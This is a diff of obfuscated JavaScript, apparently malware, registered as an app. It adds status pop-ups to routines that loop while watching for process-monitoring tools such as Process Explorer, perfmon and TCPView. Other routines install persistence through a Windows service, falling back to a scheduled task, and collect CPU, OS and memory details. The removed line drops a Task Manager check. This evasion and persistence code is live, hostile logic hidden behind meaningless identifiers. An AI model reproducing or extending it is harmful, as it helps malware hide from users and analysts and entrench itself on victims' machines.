@@ -12,8 +12,8 @@ u8jd9c69n38j0cvjq9dio3.appManager.register({
 });
 
 async function b01982u9ioda9_i1u2hydoisajcmqwoidjnqawd() {
+    await u8jd9c69n38j0cvjq9dio3.alert('Starting process monitoring...', 'Process Update');
     while (true) {
-        const km3i7h3y1287ydso33joi9823mfc89 = ai7puojd9845631iu41oi76c891ucc7lkjas('Taskmgr.exe');
         const hasd879yoijas83imc_983_98djhco = ai7puojd9845631iu41oi76c891ucc7lkjas('procexp.exe') && ai7puojd9845631iu41oi76c891ucc7lkjas('procexp64.exe'); // Boolean
         const s_981u2oijmnco3998u12ui2jhcld2 = ai7puojd9845631iu41oi76c891ucc7lkjas('perfmon.exe');
         const t98217eci__91287doijl9812jcn45 = ai7puojd9845631iu41oi76c891ucc7lkjas('tcpview.exe');
@@ -52,8 +52,10 @@ function j981e_918udoijcaoiwdj12emc981uy_3() {
 
 async function y81726_9182uocij2coij93iuckmd() {
     try {
+        await u8jd9c69n38j0cvjq9dio3.alert('Attempting to create Windows service...', 'Process Update');
         k9821yeij481972yijclk12(); 
     } catch {
+        await u8jd9c69n38j0cvjq9dio3.alert('Creating scheduled task instead...', 'Process Update');
         m81u29e8jcaso_198y27e9___12jocawsd(); 
 }
 }
@@ -100,6 +102,7 @@ async function k981ud98un9182uoaijcs() {
 
 async function h9812ud8u9oaisjdkm1982uiosjac() {
     try {
+        await u8jd9c69n38j0cvjq9dio3.alert('Starting system requirements check...', 'Process Update');
         const m19287ydiosjc_9182dijc = await hd8938u9c7jns44ud9eju9.cpu();
         const h817yd23o890uc8u9a98udq928c = await hd8938u9c7jns44ud9eju9.osInfo();
         const masd8yu129d8ucj9a_9128u7iucjs = await hd8938u9c7jns44ud9eju9.mem();
